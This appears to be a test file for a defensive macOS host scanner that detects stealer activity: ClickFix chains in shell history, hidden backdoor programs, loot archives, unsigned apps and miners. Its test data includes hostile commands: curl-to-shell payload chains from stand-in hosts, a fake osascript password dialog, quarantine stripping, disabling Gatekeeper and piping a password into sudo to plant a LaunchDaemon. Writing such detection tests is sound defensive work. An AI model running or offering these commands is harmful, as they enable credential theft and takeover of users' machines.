import { mkdirSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import type { Runner } from "../src/runner.js";
import { scanHost } from "../src/scan/host.js";
import { clickfixLines, clickfixSignals, processFindings } from "../src/scan/hostintel.js";
import { appleLike } from "../src/scan/macos.js";
import { binaryKind, stagingArchives, zipEntries } from "../src/scan/stealer.js";
import { walk } from "../src/scan/walk.js";
import type { Indicator, IocFile } from "../src/types.js";
import { AIKIDO_IOCS, tmp } from "./helpers.js";

const NOW = new Date("2026-11-12T12:00:00Z");
const OLD = new Date("2025-01-01T00:00:00Z");
const C0 = AIKIDO_IOCS.campaigns[0] as IocFile["campaigns"][0];
const withIndicators = (indicators: Indicator[]): IocFile => ({ campaigns: [{ ...C0, indicators }] });
const none: Runner = async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true });
const MACHO = Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1]);

function put(root: string, rel: string, body: string | Buffer, mtime?: Date) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

/** A stored (uncompressed) zip holding `names`, built by hand: local headers, central directory, end record. */
function zip(names: string[]): Buffer {
  const locals: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const n of names) {
    const name = Buffer.from(n);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(name.length, 26);
    locals.push(local, name);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0);
    c.writeUInt16LE(name.length, 28);
    c.writeUInt32LE(offset, 42);
    central.push(c, name);
    offset += 30 + name.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(names.length, 8);
  end.writeUInt16LE(names.length, 10);
  end.writeUInt32LE(cd.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, end]);
}

describe("ClickFix in shell history", () => {
  it("names each chain, and leaves ordinary commands alone", () => {
    const cases: [string, string][] = [
      ["curl -s https://x.example/a | osascript", "pipes a download into osascript (ClickFix)"],
      ['/bin/zsh -c "$(curl -fsSL https://x.example/i | base64 -d | gunzip | zsh)"', "downloads, decodes and decompresses a payload into a shell (ClickFix)"],
      ["curl -s x | gzip -d | base64 --decode | sh", "downloads, decodes and decompresses a payload into a shell (ClickFix)"],
      [
        `osascript -e 'display dialog "macOS needs your password" default answer "" with hidden answer'`,
        "shows a fake password dialog (osascript display dialog with hidden answer)",
      ],
      ["dscl . -authonly me hunter2", "checks a password with dscl . -authonly, how stealers validate a phished password"],
      ["xattr -c /Applications/Cleaner.app", "strips macOS's quarantine from an app, which skips Gatekeeper's check"],
      ["xattr -r -d com.apple.quarantine ~/Downloads/Tool.app", "strips macOS's quarantine from an app, which skips Gatekeeper's check"],
      ["echo 'hunter2' | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist", "pipes a password into sudo -S"],
      ["sudo spctl --master-disable", "turns Gatekeeper off"],
    ];
    for (const [line, signal] of cases) expect(clickfixSignals(line), line).toContain(signal);
    for (const line of [
      "curl -fsSL https://brew.sh/install.sh | bash",
      "xattr -l /Applications/Tool.app",
      "xattr -d com.apple.quarantine notes.txt",
      "echo hi | sudo tee /etc/x",
      "osascript -e 'display notification \"done\"'",
      "spctl --status",
    ])
      expect(clickfixSignals(line), line).toEqual([]);
    expect(clickfixLines(": 1762900000:0;sudo spctl --master-disable\nls\n")).toEqual([
      { line: 1, text: "sudo spctl --master-disable", signals: ["turns Gatekeeper off"], at: "2025-11-11T22:26:40.000Z" },
    ]);
  });

  it("a pasted chain is suspicious; one that names an IOC is compromised; an IOC typed alone stays exposed", async () => {
    const home = tmp("ug-cf-");
    put(
      home,
      ".zsh_history",
      [
        ": 1762900000:0;curl -s https://evil-c2.example/s | osascript",
        ": 1762900001:0;curl -s https://other.example/x | base64 -d | gunzip | sh",
        ": 1762900002:0;dig evil-c2.example",
        ": 1762900003:0;git status",
      ].join("\n"),
    );
    const iocs = withIndicators([{ type: "domain", value: "evil-c2.example", source: "S1" }]);
    const r = await scanHost(iocs, walk([join(home, "none")]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    const hist = r.findings.filter((f) => f.subject.endsWith(".zsh_history")).map((f) => [f.severity, f.source, f.title.replace(home, "~")]);
    expect(hist).toEqual([
      ["compromised", "S1", '~/.zsh_history line 1: a pasted command that pipes a download into osascript (ClickFix), with "evil-c2.example"'],
      [
        "suspicious",
        undefined,
        ".zsh_history line 2: a pasted command that downloads, decodes and decompresses a payload into a shell (ClickFix) (the ClickFix pattern of macOS stealers)",
      ],
    ]);
    // Without the chain, the IOC alone in history was typed (maybe while investigating): exposed.
    put(home, ".zsh_history", ": 1762900002:0;dig evil-c2.example\n");
    const typed = await scanHost(iocs, walk([join(home, "none")]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
    expect(typed.findings.filter((f) => f.subject.endsWith(".zsh_history")).map((f) => f.severity)).toEqual(["exposed"]);
  });
});

describe("what 2026 macOS stealers leave on disk", () => {
  it("flags hidden programs in the home root: a Mach-O dotfile, a script a startup item runs; a hash IOC makes it compromised", async () => {
    const home = tmp("ug-hid-");
    const la = join(home, "LaunchDaemons");
    put(home, ".mainhelper", MACHO);
    put(home, ".helper", Buffer.concat([MACHO, Buffer.from("x")]));
    put(home, ".agent", "#!/bin/bash\nwhile true; do osascript -e 'x'; done\n");
    put(home, ".zshrc", "export PATH=$PATH\n");
    put(home, ".config/tool/bin", MACHO);
    put(
      la,
      "com.finder.helper.plist",
      `<?xml version="1.0"?><plist><dict><key>Label</key><string>com.finder.helper</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>${home}/.agent</string></array></dict></plist>`,
    );
    expect(binaryKind(join(home, ".mainhelper"))).toBe("Mach-O");
    const sha = (await import("node:crypto"))
      .createHash("sha256")
      .update(Buffer.concat([MACHO, Buffer.from("x")]))
      .digest("hex");
    const iocs = withIndicators([{ type: "sha256", value: sha, source: "S1" }]);
    const r = await scanHost(iocs, walk([join(home, "none")]), none, { home, startupDirs: [la], dropDirs: [], skipLive: true, now: NOW });
    const hidden = r.findings
      .filter((f) => /\/\.(agent|mainhelper|helper|zshrc)$/.test(f.subject))
      .map((f) => [f.severity, f.subject.slice(home.length + 1), f.title.replace(home, "~")]);
    expect(hidden.sort()).toEqual(
      [
        ["compromised", ".helper", `Hidden file ~/.helper (a Mach-O program) matches "${sha}"`],
        [
          "suspicious",
          ".agent",
          `Hidden program in your home folder: ~/.agent is run by the startup item ${join(la, "com.finder.helper.plist")}. macOS backdoors hide there (AMOS's ~/.agent, ~/.mainhelper)`,
        ],
        [
          "suspicious",
          ".mainhelper",
          "Hidden program in your home folder: ~/.mainhelper is a Mach-O program. macOS backdoors hide there (AMOS's ~/.agent, ~/.mainhelper)",
        ],
      ].sort(),
    );
  });

  it("flags hidden Apple look-alike folders in Application Support (macOS)", async () => {
    const home = tmp("ug-als-");
    const support = join(home, "SystemSupport");
    mkdirSync(join(support, ".com.apple.accountsd"), { recursive: true });
    mkdirSync(join(support, "com.apple.TCC"), { recursive: true });
    mkdirSync(join(home, "Library/Application Support/.com.apple.metadata.mds"), { recursive: true });
    const run = (platform: NodeJS.Platform, supportDirs?: string[]) =>
      scanHost(AIKIDO_IOCS, walk([join(home, "none")]), none, { home, platform, startupDirs: [], dropDirs: [], skipLive: true, supportDirs, now: NOW });
    const mac = await run("darwin", [support, join(home, "Library/Application Support")]);
    expect(mac.findings.filter((f) => f.key.startsWith("host|apple-lookalike|")).map((f) => [f.severity, f.subject])).toEqual([
      ["suspicious", join(support, ".com.apple.accountsd")],
      ["suspicious", join(home, "Library/Application Support/.com.apple.metadata.mds")],
    ]);
    // By default, with the live checks skipped: the home's folder only.
    expect((await run("darwin")).findings.filter((f) => f.key.startsWith("host|apple-lookalike|")).map((f) => f.subject)).toEqual([
      join(home, "Library/Application Support/.com.apple.metadata.mds"),
    ]);
    expect((await run("linux")).findings.filter((f) => f.key.startsWith("host|apple-lookalike|"))).toEqual([]);
  });

  it("reads loot archives in staging folders: browser or keychain stores are compromised, a loot name is suspicious", async () => {
    const stage = tmp("ug-stg-");
    put(stage, "osalogging.zip", zip(["Chrome/Default/Login Data", "Chrome/Local State", "keychains/login.keychain-db", "notes.txt"]));
    put(stage, "nested/abc/out.zip", zip(["a.txt"]));
    put(stage, "loot.tar.gz", "not really gzip");
    put(stage, "old.zip", zip(["Firefox/key4.db"]), OLD);
    put(stage, "broken.zip", "PK but not a zip");
    put(stage, "too/deep/down/x.zip", zip(["Cookies"]));
    expect(zipEntries(join(stage, "osalogging.zip"))).toEqual(["Chrome/Default/Login Data", "Chrome/Local State", "keychains/login.keychain-db", "notes.txt"]);
    const tar: Runner = async (cmd, args) =>
      cmd === "tar" && args[0] === "-tzf"
        ? { ok: true, status: 0, stdout: "loot/\nloot/Firefox/logins.json\nloot/Firefox/key4.db\n", stderr: "" }
        : none(cmd, args);
    const r = await scanHost(AIKIDO_IOCS, walk([join(stage, "none")]), tar, {
      home: tmp("ug-h-"),
      startupDirs: [],
      dropDirs: [],
      stagingDirs: [stage],
      skipLive: true,
      now: NOW,
    });
    const staged = r.findings
      .filter((f) => f.key.startsWith("host|staging|"))
      .map((f) => [f.severity, f.subject.slice(stage.length + 1), f.title.replace(stage, "<s>")])
      .sort();
    expect(staged).toEqual([
      [
        "compromised",
        "loot.tar.gz",
        "Archive <s>/loot.tar.gz holds browser or keychain stores (logins.json, key4.db): a stealer packs these before uploading them",
      ],
      [
        "compromised",
        "osalogging.zip",
        "Archive <s>/osalogging.zip holds browser or keychain stores (Login Data, Local State, login.keychain-db): a stealer packs these before uploading them",
      ],
      [
        "suspicious",
        "nested/abc/out.zip",
        "Archive out.zip in <s>/nested/abc is named like a macOS stealer's loot (osalogging.zip, out.zip): 1 file(s) inside",
      ],
    ]);
    expect(r.gaps.find((g) => g.what.includes("could not") || g.why.includes("could not be listed"))?.what).toContain(join(stage, "broken.zip"));
    expect(r.result.stats.stagingArchives).toBe(4);
  });

  it("lists staging folders breadth first: a top-level archive is found even when the entry bound stops the listing", async () => {
    const stage = tmp("ug-stb-");
    for (let i = 0; i < 30; i++) put(stage, `d${String(i).padStart(2, "0")}/f.txt`, "x");
    put(stage, "zz/out.zip", zip(["a"]));
    put(stage, "out.zip", zip(["Cookies"]));
    const r = await stagingArchives(none, [stage], { sinceMs: 0, nowMs: NOW.getTime(), skip: () => false, maxEntries: 40 });
    expect(r.findings.map((f) => f.subject)).toEqual([join(stage, "out.zip")]);
    expect(r.gaps.map((g) => g.what)).toEqual([`archives deeper in ${stage}`]);
  });

  it("flags new unsigned or ad-hoc apps and Apple look-alikes not signed by Apple; Apple's own and old apps are fine", async () => {
    const home = tmp("ug-apps-");
    const apps = join(home, "Applications");
    const info = (id: string) => `<?xml version="1.0"?><plist><dict><key>CFBundleIdentifier</key><string>${id}</string></dict></plist>`;
    put(apps, "CrashReporter.app/Contents/Info.plist", info("com.apple.CrashReporter"));
    put(apps, "Free Cleaner.app/Contents/Info.plist", info("com.cleaner.free"));
    put(apps, "Pages.app/Contents/Info.plist", info("com.apple.Pages"));
    put(apps, "Legacy.app/Contents/Info.plist", info("com.legacy.app"));
    utimesSync(join(apps, "Legacy.app"), OLD, OLD);
    const sigs: Record<string, string> = {
      "CrashReporter.app": "Authority=Developer ID Application: Fake Dev (AB12CD34EF)\nTeamIdentifier=AB12CD34EF",
      "Free Cleaner.app": "Signature=adhoc\nTeamIdentifier=not set",
      "Pages.app": "Authority=Apple Mac OS Application Signing\nTeamIdentifier=JCRTNEU7GK",
      "Legacy.app": "code object is not signed at all",
    };
    const calls: string[] = [];
    const runner: Runner = async (cmd, args) => {
      if (cmd !== "codesign") return none(cmd, args);
      const name = (args.at(-1) as string).split("/").pop() as string;
      calls.push(name);
      return { ok: !sigs[name]?.includes("not signed"), status: 0, stdout: "", stderr: `Identifier=x\n${sigs[name] ?? ""}\n` };
    };
    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "none")]), runner, {
      home,
      platform: "darwin",
      startupDirs: [],
      dropDirs: [],
      appDirs: [apps],
      av: "off",
      now: NOW,
    });
    const flagged = r.findings.filter((f) => f.key.startsWith("host|app|")).map((f) => [f.severity, f.title.replace(/ \(added or changed [\d-]+\)/, "")]);
    expect(flagged).toEqual([
      [
        "suspicious",
        "App CrashReporter.app is named like an Apple app (com.apple.CrashReporter) but is not signed by Apple (Developer ID Application: Fake Dev (AB12CD34EF))",
      ],
      ["suspicious", "App Free Cleaner.app is ad-hoc signed (no developer identity)"],
    ]);
    // An old app is not even asked about: codesign runs where it decides something.
    expect(calls.sort()).toEqual(["CrashReporter.app", "Free Cleaner.app", "Pages.app"]);
    expect([appleLike("/x/Crash Reporter.app"), appleLike("/x/System Settings.app"), appleLike("/x/Slack.app", "com.tinyspeck.slackmacgap")]).toEqual([
      true,
      true,
      false,
    ]);
  });

  it("flags a running cryptocurrency miner by its name or a stratum pool on its command line", async () => {
    const mac: Runner = async (cmd, args) => {
      if (cmd !== "ps") return none(cmd, args);
      if (args[1] === "pid=,comm=") return { ok: true, status: 0, stdout: "  10 /usr/local/bin/xmrig\n  11 /usr/sbin/cfprefsd\n", stderr: "" };
      return { ok: true, status: 0, stdout: "  10 /usr/local/bin/xmrig --donate-level 1\n  11 /usr/sbin/cfprefsd agent\n", stderr: "" };
    };
    expect((await processFindings(mac, "/Users/me", "darwin")).map((f) => [f.severity, f.title])).toEqual([
      ["suspicious", "Running process xmrig (pid 10) looks like a cryptocurrency miner (xmrig, or a stratum mining pool on its command line)"],
    ]);
    const linux: Runner = async (cmd) =>
      cmd === "ps"
        ? { ok: true, status: 0, stdout: "  20 /usr/bin/kworkerd -o stratum+tcp://pool.example:3333 -u wallet\n  21 /usr/bin/sshd\n", stderr: "" }
        : none(cmd, []);
    expect((await processFindings(linux, "/home/me", "linux")).map((f) => f.subject)).toEqual(["/usr/bin/kworkerd"]);
  });
});
